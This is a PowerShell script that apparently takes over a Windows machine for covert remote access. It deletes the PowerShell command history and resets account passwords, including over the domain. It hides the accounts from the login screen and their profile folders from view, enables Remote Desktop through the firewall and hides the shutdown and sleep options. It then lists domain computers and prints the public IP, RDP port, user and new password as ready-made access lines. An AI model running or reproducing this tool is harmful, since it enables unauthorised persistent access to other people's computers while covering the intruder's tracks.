Clear-Host
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

$currentOnly = Read-Host "[!] are you need do this only current user? "

Function Generate-Password($length = 30) {
    $lower = "abcdefghijklmnopqrstuvwxyz".ToCharArray()
    $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
    $digits = "0123456789".ToCharArray()
    $symbols = "!@#$%+=-".ToCharArray()
    $all = $lower + $upper + $digits + $symbols

    $password = @()
    $password += $lower | Get-Random
    $password += $upper | Get-Random
    $password += $digits | Get-Random
    $password += $symbols | Get-Random
    $remaining = $length - 4
    $password += 1..$remaining | ForEach-Object { $all | Get-Random }

    -join ($password | Get-Random -Count $password.Count)
}

$users = @("HomeGroupUser", "Other user")
$passwords = @{}
$tempDir = "$env:TEMP\pol_temp"
$configFile = "$tempDir\secpol.inf"
$dbFile = "$tempDir\secpol.sdb"
New-Item -ItemType Directory -Path $tempDir -Force > $null

$currentUser = "$env:USERDOMAIN\$env:USERNAME"
$adminSID = "S-1-5-32-544"
$rdpUsersSID = "S-1-5-32-555"
$adminGroupName = (New-Object System.Security.Principal.SecurityIdentifier($adminSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
$rdpGroupName = (New-Object System.Security.Principal.SecurityIdentifier($rdpUsersSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]

# Export existing local policies
secedit /export /cfg $configFile > $null 2>&1
$lines = [System.Collections.Generic.List[string]](Get-Content $configFile)
$privRightsIndex = $lines.IndexOf("[Privilege Rights]")
if ($privRightsIndex -ne -1) {
    $shutdownIndex = ($lines | Select-String "^SeShutdownPrivilege").LineNumber
    if ($shutdownIndex) {
        $lines[$shutdownIndex[0] - 1] = "SeShutdownPrivilege = $adminSID"
    } else {
        $lines.Insert($privRightsIndex + 1, "SeShutdownPrivilege = $adminSID")
    }

    if ($currentOnly -ne '1') {
        $denyIndex = ($lines | Select-String "^SeDenyRemoteInteractiveLogonRight").LineNumber
        $denyUsers = @($users | ForEach-Object { "$env:COMPUTERNAME\$_" })

        if ($denyIndex) {
            $lineNum = $denyIndex[0] - 1
            $existing = $lines[$lineNum].Split("=")[1].Trim() -split ","
            foreach ($du in $denyUsers) {
                if ($existing -notcontains $du) { $existing += $du }
            }
            $lines[$lineNum] = "SeDenyRemoteInteractiveLogonRight = " + ($existing -join ",")
        } else {
            $lines.Insert($privRightsIndex + 2, "SeDenyRemoteInteractiveLogonRight = " + ($denyUsers -join ","))
        }
    }

    $lines | Set-Content $configFile -Encoding Unicode > $null
    secedit /configure /db $dbFile /cfg $configFile /areas USER_RIGHTS /quiet > $null
}
Remove-Item $tempDir -Recurse -Force > $null

# Registry policies to hide shutdown/sleep/hibernate buttons
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ShutdownWithoutLogon" -Value 0 -Type DWord > $null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutdown" -Name "Value" -Value 1 -Type DWord > $null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideSleep" -Name "Value" -Value 1 -Type DWord > $null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideHibernate" -Name "Value" -Value 1 -Type DWord > $null

# RDP settings
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 > $null
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" > $null
Set-Service -Name TermService -StartupType Automatic > $null
Start-Service TermService > $null

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force > $null }

# User processing
if ($currentOnly -eq '1') {
    $current = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    $password = Generate-Password
    net user "$current" $password
    $passwords[$current] = $password

    New-ItemProperty -Path $regPath -Name "$current" -PropertyType DWORD -Value 0 -Force > $null
    attrib +h +s "$env:SystemDrive\Users\$current"
} else {
    foreach ($user in $users) {
        $password = Generate-Password
        try {
            net user "$user" $password > $null 2>&1
            net user "$user" $password /domain > $null 2>&1
            $passwords[$user] = $password

            New-ItemProperty -Path $regPath -Name "$user" -PropertyType DWORD -Value 0 -Force > $null
            attrib +h +s "$env:SystemDrive\Users\$user"
        } catch {
            Write-Host "[!] failed to process '$user'"
        }
    }
}

# Network info
Write-Host "`n=== all ip adapters ==="
$localIP = $null
Get-NetIPAddress | Where-Object { $_.IPAddress -match '\d+\.\d+\.\d+\.\d+' } | ForEach-Object {
    Write-Host $_.InterfaceAlias":" $_.IPAddress
    if (-not $localIP) { $localIP = $_.IPAddress }
}

try {
    $publicIP = (Invoke-RestMethod -Uri "https://checkip.amazonaws.com").Trim()
    if ($publicIP -notmatch '^\d{1,3}(\.\d{1,3}){3}$') {
        $publicIP = "UNKNOWN"
    }
} catch {
    $publicIP = "UNKNOWN"
}

try {
    $rdpPort = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "PortNumber").PortNumber
} catch {
    $rdpPort = 3389
}

Write-Host "`n=== domain ==="
try {
    $compSys = Get-WmiObject Win32_ComputerSystem
    if ($compSys.PartOfDomain) {
        Write-Host "domain: $($compSys.Domain)"
        try {
            $domainComputers = Get-ADComputer -Filter * -Property Name | Select-Object -ExpandProperty Name
            Write-Host "computers in domain:"
            $domainComputers | ForEach-Object { Write-Host " - $_" }
        } catch {
            Write-Host "error get list of computers on domain"
        }
    } else {
        Write-Host "workgroup: $($compSys.Workgroup)"
    }
} catch {
    Write-Host "could not determine domain or workgroup information"
}

Write-Host "`n=== whoami ==="
whoami

Write-Host "`n=== details ==="
if ($publicIP -eq "UNKNOWN") {
    Write-Host "[!] Public IPv4 address could not be determined."
}

if ($currentOnly -eq '1') {
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    Write-Host "$publicIP`:$rdpPort@$user;$($passwords[$user])"
} else {
    foreach ($user in $users) {
        if ($passwords.ContainsKey($user)) {
            Write-Host "$publicIP`:$rdpPort@$user;$($passwords[$user])"
        }
    }
}
